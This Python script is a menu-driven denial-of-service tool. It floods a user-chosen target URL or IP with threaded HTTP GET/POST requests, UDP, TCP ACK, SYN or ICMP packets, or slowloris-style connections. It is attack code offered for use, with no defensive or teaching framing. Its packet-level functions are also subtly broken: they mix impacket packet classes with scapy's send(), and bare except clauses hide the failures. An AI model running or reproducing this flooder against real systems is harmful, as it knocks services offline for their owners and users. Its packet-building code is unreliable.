import socket
import random
import sys
import time
import threading
import requests
from scapy.all import send
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP


# Layer 4 Attacks

def udp_attack(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(random._urandom(1024), (target_ip, target_port))
            s.close()
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            pass

def syn_attack(target_ip, target_port):
    while True:
        try:
            src_port = random.randint(1024, 65535)
            seq = random.randint(0, 100000)
            ip_pkt = IP(dst=target_ip)
            tcp_pkt = TCP(sport=src_port, dport=target_port, flags="S", seq=seq)
            send(ip_pkt/tcp_pkt, verbose=0)
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            pass

def tcp_attack(target_ip, target_port):
    while True:
        try:
            src_port = random.randint(1024, 65535)
            seq = random.randint(0, 100000)
            ip_pkt = IP(dst=target_ip)
            tcp_pkt = TCP(sport=src_port, dport=target_port, flags="A", seq=seq)
            send(ip_pkt/tcp_pkt, verbose=0)
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            pass

def icmp_attack(target_ip):
    while True:
        try:
            send(IP(dst=target_ip)/ICMP(), verbose=0)
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            pass


# HTTP Flood Attacks

def get_attack(target_url):
    while True:
        try:
            requests.get(target_url)
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            pass

def post_attack(target_url, data):
    while True:
        try:
            requests.post(target_url, data=data)
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            pass

def slowloris_attack(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendall(b"GET / HTTP/1.1\r\n")
            time.sleep(15)
            s.close()
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            pass

def main():

    txt = """1 - GET
2 - POST
3 - UDP
4 - TCP
5 - SYN
6 - ICMP
7 - SLOW
Choose Attack Type: """

    target_url = ""
    target_ip = ""
    target_port = ""
    choice = int(input(txt))

    threads_count = int(input("Enter the number of threads: "))

    if choice<=2:
        target_url = input("Enter the target URL: ")
    else:
        target_ip = input("Enter the target IP address: ")
        target_port = int(input("Enter the target port number: "))

    if choice == 1:
        get_threads = [threading.Thread(target=get_attack, args=(target_url,)) for _ in range(threads_count)]

        for thread in get_threads:  # + post_threads: #+ slowloris_threads:
            thread.start()

    elif choice == 2:
        data = "dawugdoua@hgofhawfpoiaw"#input("Enter the POST data: ")
        post_threads = [threading.Thread(target=post_attack, args=(target_url, data)) for _ in range(threads_count)]

        for thread in post_threads:  # + post_threads: #+ slowloris_threads:
            thread.start()

    elif choice == 3:

        udp_threads = [threading.Thread(target=udp_attack, args=(target_ip, target_port)) for _ in
                       range(threads_count)]
        for thread in udp_threads:  # + post_threads: #+ slowloris_threads:
            thread.start()

    elif choice == 4:
        tcp_threads = [threading.Thread(target=tcp_attack, args=(target_ip, target_port)) for _ in range(threads_count)]

        for thread in tcp_threads:  # + post_threads: #+ slowloris_threads:
            thread.start()

    elif choice == 5:
        syn_threads = [threading.Thread(target=syn_attack, args=(target_ip, target_port)) for _ in range(threads_count)]

        for thread in syn_threads:  # + post_threads: #+ slowloris_threads:
            thread.start()

    elif choice == 6:
        icmp_threads = [threading.Thread(target=icmp_attack, args=(target_ip,)) for _ in range(threads_count)]

        for thread in icmp_threads:  # + post_threads: #+ slowloris_threads:
            thread.start()

    elif choice == 7:
        slowloris_threads = [threading.Thread(target=slowloris_attack, args=(target_ip, target_port)) for _ in range(threads_count)]

        for thread in slowloris_threads:  # + post_threads: #+ slowloris_threads:
            thread.start()



    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()

